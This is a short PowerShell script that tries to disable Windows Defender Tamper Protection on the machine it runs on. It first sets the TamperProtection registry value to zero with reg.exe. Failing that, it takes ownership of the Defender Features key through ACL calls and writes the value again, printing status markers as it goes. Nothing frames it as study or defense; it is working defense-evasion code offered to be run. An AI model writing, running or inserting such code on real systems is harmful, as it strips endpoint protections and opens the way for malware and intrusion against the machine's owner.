$ErrorActionPreference = 'Continue'

# --- Attempt to take ownership of the Defender Features key to disable Tamper Protection ---
$keyPath = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
Write-Output "--- Try takeown on $keyPath ---"
try {
  # Use reg.exe to take ownership + grant
  cmd /c "reg add `"HKLM\SOFTWARE\Microsoft\Windows Defender\Features`" /v TamperProtection /t REG_DWORD /d 0 /f" 2>&1 | ForEach-Object { Write-Output "REG|$_" }
} catch { Write-Output "REG_ADD_ERR $($_.Exception.Message)" }

# Try PowerShell ACL approach
try {
  $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Windows Defender\Features', [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
  if ($regKey) {
    $acl = $regKey.GetAccessControl()
    $admin = New-Object System.Security.Principal.NTAccount('BUILTIN\Administrators')
    $acl.SetOwner($admin)
    $regKey.SetAccessControl($acl)
    $regKey.Close()
    Write-Output 'TAKEOWN_OK'
    Set-ItemProperty -Path $keyPath -Name 'TamperProtection' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
    $v = (Get-ItemProperty $keyPath -Name 'TamperProtection' -ErrorAction SilentlyContinue).TamperProtection
    Write-Output "TAMPERPROTECTION_VALUE $v"
  } else {
    Write-Output 'OPEN_TAKEOWN_DENIED'
  }
} catch { Write-Output "TAKEOWN_ERR $($_.Exception.Message)" }
